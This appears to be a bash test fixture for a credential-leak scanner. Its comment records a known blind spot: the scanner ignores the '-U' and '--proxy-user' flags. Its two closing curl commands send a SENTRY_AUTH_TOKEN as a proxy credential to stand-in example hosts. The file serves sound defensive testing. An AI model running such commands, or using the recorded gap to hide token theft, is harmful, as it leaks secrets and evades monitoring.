#!/usr/bin/env bash
set -uo pipefail

case "$-" in
  *x*)
    if [ -n "${SENTRY_AUTH_TOKEN:+x}${SUPABASE_ANON_KEY:+x}" ]; then
      printf "[FATAL] refusing to trace with a live credential set (#7797)\n" >&2
      exit 78
    fi
    ;;
esac

# PINNED BLIND SPOT (xfail, not an evasion to pretend away): `-U` / `--proxy-user` carry a PROXY
# credential, a different flag from basic-auth `-u` (the match is case-sensitive). The arm does not
# read them, so this file reads clean (rc 0). The suite pins that verdict so widening the
# vocabulary is a visible edit to this row, never a silent drift.
readonly SINK_URL_PINNED="https://pinned.example/ingest"
SINK_URL="${FIXTURE_SINK_URL:-$SINK_URL_PINNED}"
if [ "$SINK_URL" != "https://pinned.example/ingest" ]; then
  printf 'refusing an unpinned destination\n' >&2
  exit 2
fi

curl --disable --noproxy '*' -sS -x "http://proxy.example:3128" -U "svc:${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -x "http://proxy.example:3128" --proxy-user "svc:${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
